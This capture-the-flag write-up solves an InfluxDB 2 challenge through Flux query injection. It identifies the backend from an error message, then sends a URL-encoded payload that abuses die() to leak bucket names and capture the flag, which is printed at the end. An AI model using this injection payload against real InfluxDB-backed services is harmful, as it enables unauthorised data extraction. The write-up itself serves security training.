## Quest Details:

![[2.4.0.png]]

## Steps:

1. Go to the target URL:  ```http://66.228.53.87:9001/``` 

![[2.4.1.png]]

![[2.4.2.png]]

2. We try to follow the hint and query the database with an injection, and we have an error shown here

![[2.4.3.png]]

3. After googling the error, we found out that the database is from InfluxDB 2

![[2.4.4.png]]

4. Open up burpsuite and select the query from which we just did to repeater

![[2.4.5.png]]

![[2.4.6.png]]

5. Craft our payload and URL encode it:

`") |> yield(name: "1337")` 
`buckets() |> filter(fn: (r) => r.name =~ /^.*/ and die(msg:r.name))` 
`//`

`%22)%20%7C%3E%20yield(name:%20%221337%22)%20%0D%0Abuckets()%20%7C%3E%20filter(fn:%20(r)%20=%3E%20r.name%20=~%20/%5E.*/%20and%20die(msg:r.name))%20%0D%0A//`

6. Send the request and we get the flag

![[2.4.7.png]]

## Flag: KCTF{g0UPqVWa0eUT2wF2ipzX3v5pxikvqYhxR9OL}